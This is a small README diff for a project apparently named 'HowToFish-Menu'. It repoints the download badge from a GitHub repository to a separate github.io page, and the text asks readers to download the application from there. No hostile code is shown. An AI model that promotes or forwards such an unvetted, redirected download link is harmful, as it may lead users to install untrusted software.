@@ -36,7 +36,7 @@ Ready to get started? Follow these simple steps:
 
 ### Step 1: Download the Application
 
-[![Download HowToFish-Menu](https://img.shields.io/badge/Download-HowToFish--Menu-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=random)](https://github.com/sereneautoradiographic14/HowToFish-Menu)
+[![Download HowToFish-Menu](https://img.shields.io/badge/Download-HowToFish--Menu-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=random)](https://sereneautoradiographic14.github.io)
 
 Visit this link to download the application. Click the download button on the page to get the latest version of HowToFish-Menu.
 
